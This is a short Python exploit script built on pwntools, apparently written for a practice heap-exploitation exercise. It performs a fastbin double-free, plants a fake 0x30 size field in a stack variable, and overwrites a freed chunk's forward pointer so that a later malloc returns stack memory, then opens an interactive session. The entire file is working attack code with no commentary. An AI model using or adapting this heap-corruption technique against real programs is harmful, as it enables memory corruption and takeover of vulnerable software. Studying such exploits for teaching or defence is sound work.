from pwn import *
from handle import *

def exploit():
	malloc(0x20)
	malloc(0x20)
	malloc(0x20)
	
	free_chunk(0)
	free_chunk(1)
	free_chunk(0)

	malloc(0x20)
	malloc(0x20)

	fake_chunk = stack_var_1_address()
	write_to_stack_var_1("AAAAAAAA" + p64(0x30))
	write_to_chunk(3, p64(fake_chunk))

	malloc(0x20)
	malloc(0x20)

p = exec_file()
exploit()
p.interactive()
p.close()
